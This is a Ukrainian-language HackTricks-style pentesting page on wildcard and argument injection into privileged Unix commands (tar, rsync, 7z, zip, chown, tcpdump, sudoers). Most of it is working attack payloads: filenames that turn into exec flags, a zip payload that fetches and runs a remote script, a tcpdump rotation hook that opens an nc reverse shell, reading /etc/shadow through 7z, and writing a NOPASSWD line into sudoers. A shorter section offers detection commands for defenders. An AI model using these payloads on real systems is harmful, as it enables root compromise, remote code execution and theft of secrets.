# Запасні трюки з Wildcards

{{#include ../../banners/hacktricks-training.md}}

> **Ін'єкція аргументів** через Wildcard (також *glob*) відбувається, коли привілейований скрипт запускає Unix-бінарний файл, як-от `tar`, `chown`, `rsync`, `zip`, `7z`, … із wildcard без лапок, наприклад `*`.
> Оскільки shell розгортає wildcard **до** запуску бінарного файлу, зловмисник, який може створювати файли в робочому каталозі, може створити імена файлів, що починаються з `-`, щоб вони інтерпретувалися як **опції, а не дані**, фактично приховано передаючи довільні flags або навіть команди.
> На цій сторінці зібрано найкорисніші примітиви, нещодавні дослідження та сучасні способи виявлення за 2023-2025 роки.

## chown / chmod

Ви можете **скопіювати власника/групу або біти дозволів довільного файлу**, зловживаючи flag `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Коли root пізніше виконає щось на кшталт:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` впроваджується, через що *всі* файли, що відповідають шаблону, успадковують власність/права доступу `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (комбінована атака).
Також дивіться класичну статтю DefenseCode для отримання подробиць.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Виконуйте довільні команди, зловживаючи функцією **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Після того як root виконає, наприклад, `tar -czf /root/backup.tgz *`, `shell.sh` буде виконано від імені root.

### bsdtar / macOS 14+

Стандартний `tar` у нових версіях macOS (на основі `libarchive`) *не реалізує* `--checkpoint`, але ви все одно можете досягти виконання коду за допомогою прапорця **--use-compress-program**, який дає змогу вказати зовнішній компресор.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Коли привілейований скрипт виконує `tar -cf backup.tar *`, буде запущено `/bin/sh`.

---

## rsync

`rsync` дає змогу перевизначити віддалену оболонку або навіть віддалений бінарний файл за допомогою прапорців командного рядка, що починаються з `-e` або `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Якщо root згодом архівує каталог за допомогою `rsync -az * backup:/srv/`, впроваджений прапорець запускає вашу shell на віддаленій стороні.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (режим `rsync`).

---

## 7-Zip / 7z / 7za

Навіть коли привілейований скрипт *захисно* додає до wildcard префікс `--` (щоб зупинити розбір опцій), формат 7-Zip підтримує **файли зі списками файлів**, якщо додати до імені файла префікс `@`. Поєднання цього із symlink дає змогу *exfiltrate довільні файли*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Якщо root виконує щось на кшталт:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip спробує прочитати `root.txt` (→ `/etc/shadow`) як список файлів і завершить роботу, **вивівши вміст у stderr**.

Це працює навіть із `-- *`, оскільки CLI 7-Zip явно приймає як звичайні імена файлів, так і `@listfiles` як позиційні аргументи, тому літеральне ім’я файлу на кшталт `@root.txt` усе одно обробляється спеціальним чином.

---

## zip

Існують два дуже практичні примітиви, коли застосунок передає керовані користувачем імена файлів до `zip` (через wildcard або перелічуючи імена без `--`).

- RCE через test hook: `-T` вмикає “test archive”, а `-TT <cmd>` замінює tester на довільну програму (повна форма: `--unzip-command <cmd>`). Якщо ви можете інжектити імена файлів, що починаються з `-`, розділіть flags між окремими іменами файлів, щоб працював short-options parsing:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Примітки
- НЕ намагайтеся використовувати одне ім'я файлу на кшталт `'-T -TT <cmd>'` — короткі опції обробляються посимвольно, і це не спрацює. Використовуйте окремі токени, як показано.
- Якщо застосунок видаляє косі риски з імен файлів, отримайте файл із bare host/IP (шлях за замовчуванням — `/index.html`) і збережіть його локально за допомогою `-O`, а потім виконайте.
- Ви можете налагодити parsing за допомогою `-sc` (показати оброблений argv) або `-h2` (більше довідки), щоб зрозуміти, як обробляються ваші токени.

Приклад (локальна поведінка в zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Ексфільтрація даних/leak: Якщо web layer виводить stdout/stderr `zip` (поширено у наївних wrappers), injected flags на кшталт `--help` або помилки через некоректні options з’являться у HTTP response, підтверджуючи command-line injection і допомагаючи налаштовувати payload.

---

## Додаткові binaries, вразливі до wildcard injection (короткий список за 2023–2025 роки)

Наведені нижче commands використовувалися у сучасних CTFs і реальних середовищах. Payload завжди створюється як *filename* у writable directory, який згодом оброблятиметься за допомогою wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

Ці primitives трапляються рідше, ніж класичні *tar/rsync/zip*, але їх варто перевіряти під час пошуку.

---

## Пошук вразливих wrappers і jobs

Нещодавні case studies показали, що wildcard/argv injection більше не є лише проблемою **cron + tar**. Той самий bug class продовжує з’являтися у:

- web features, які "download everything as zip/tar" із attacker-controlled upload directories
- vendor/appliance debug shells, що надають **tcpdump** wrapper з attacker-controlled filename/filter fields
- backup або rotation jobs, які викликають `tar`, `rsync`, `7z`, `zip`, `chown` або `chmod` для writable directories

Корисні команди для triage:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Швидкі евристики:

- `-- *` — хороше виправлення для багатьох GNU tools, але **не** для `7z`/`7za`, оскільки `@listfiles` обробляються окремо.
- Для `zip` шукайте wrappers, які безпосередньо перебирають filenames, контрольовані користувачем; розділення short options (`-T` + `-TT <cmd>`) усе ще працює навіть без shell glob.
- Для `tcpdump` особливу увагу приділяйте wrappers, які дають змогу контролювати **імена вихідних файлів**, **налаштування ротації** або аргументи **повторного відтворення capture-файлів**.

---

## Хуки ротації tcpdump (-G/-W/-z): RCE через ін’єкцію в argv у wrappers

Коли restricted shell або vendor wrapper формує командний рядок `tcpdump` шляхом конкатенації полів, контрольованих користувачем (наприклад, параметра "імені файлу"), без суворого quoting/validation, можна приховано передати додаткові flags `tcpdump`. Комбінація `-G` (ротація на основі часу), `-W` (обмеження кількості файлів) і `-z <cmd>` (команда після ротації) забезпечує довільне виконання команд від імені користувача, який запускає tcpdump (часто це root на appliances).

Передумови:

- Ви можете впливати на `argv`, який передається до `tcpdump` (наприклад, через wrapper на кшталт `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Wrapper не очищає пробіли або tokens, що починаються з `-`, у полі імені файлу.

Класичний PoC (запускає reverse shell script із writable path):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Деталі:

- `-G 1 -W 1` змушує виконати негайну ротацію після першого пакета, що відповідає умовам.
- `-z <cmd>` запускає post-rotate command один раз для кожної ротації. У багатьох збірках `<cmd> <savefile>` виконується саме так. Якщо `<cmd>` є script/interpreter, переконайтеся, що обробка аргументів відповідає вашому payload.

Варіанти без removable media:

- Якщо у вас є будь-який інший primitive для запису файлів (наприклад, окрема command wrapper, яка дозволяє перенаправлення виводу), помістіть свій script у відомий шлях і запустіть `-z /bin/sh /path/script.sh` або `-z /path/script.sh` залежно від семантики платформи.
- Деякі vendor wrappers виконують ротацію до location, яку може контролювати attacker. Якщо ви можете впливати на шлях ротації (symlink/directory traversal), можна спрямувати `-z` на виконання вмісту, який ви повністю контролюєте, без external media.

---

## sudoers: tcpdump with wildcards/additional args → довільний запис/читання та root

Дуже поширений anti-pattern у sudoers:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Проблеми
- Glob `*` і permissive patterns обмежують лише перший аргумент `-w`. `tcpdump` приймає кілька опцій `-w`; використовується остання.
- Правило не фіксує інші опції, тому дозволені `-Z`, `-r`, `-V` тощо.

Примітиви
- Перевизначити destination path за допомогою другого `-w` (перший лише задовольняє sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal усередині першого `-w`, щоб вийти за межі обмеженого дерева каталогів:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Примусово задавати власника виводу за допомогою `-Z root` (створює файли, власником яких є root, будь-де):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Запис довільного вмісту шляхом відтворення спеціально створеного PCAP через `-r` (наприклад, щоб додати рядок до sudoers):

<details>
<summary>Створіть PCAP, який містить точний ASCII-пейлоад, і запишіть його від імені root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Arbitrary file read/secret leak через `-V <file>` (інтерпретує список savefiles). Діагностичні повідомлення про помилки часто відображають рядки, спричиняючи leak вмісту:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Посилання

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: ін'єкція аргументів zip до RCE + неправильна конфігурація sudo для tcpdump privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - повний ланцюжок експлуатації](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - виявлено потенційний Shell через ін'єкцію wildcard](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
